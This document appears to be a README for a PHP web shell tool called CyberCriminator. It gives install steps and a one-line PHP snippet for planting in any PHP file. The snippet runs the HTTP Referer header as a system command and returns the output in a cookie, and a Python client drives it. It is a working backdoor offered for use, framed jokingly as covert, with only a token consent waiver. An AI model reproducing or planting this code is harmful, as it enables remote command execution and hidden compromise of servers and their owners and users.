# CyberCriminator
Plant it in any PHP file. Totally not *sus*

## Installation

```bash
$ sudo apt-get install python3-pip
$ pip3 install requests
$ sudo apt-get install python3-urllib3
$ git clone https://github.com/cybercriminator/Server/tree/main/NinjaMethod && cd NinjaMethod
```

## Disclaimer
Only works if `shell_exec()` function isn't disabled

## Usage

Upload `ninja.php` in the server OR insert the ff. php code anywhere in a PHP file.

```php
<? if(isset($_SERVER['HTTP_REFERER'])){$_=$_SERVER['HTTP_REFERER'];$b = `$_`;session_destroy();setcookie("x", $b, time()+30*24*60*60);} ?>
```
and then

```bash
python3 ninja.py
```

Now we can access it by inputting the NinjaMethod URL in the prompt

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## Waiver
I am NOT responsible to any misusage of this. Only do this with consent

## License
[Cyber Criminator](https://github.com/cybercriminator)
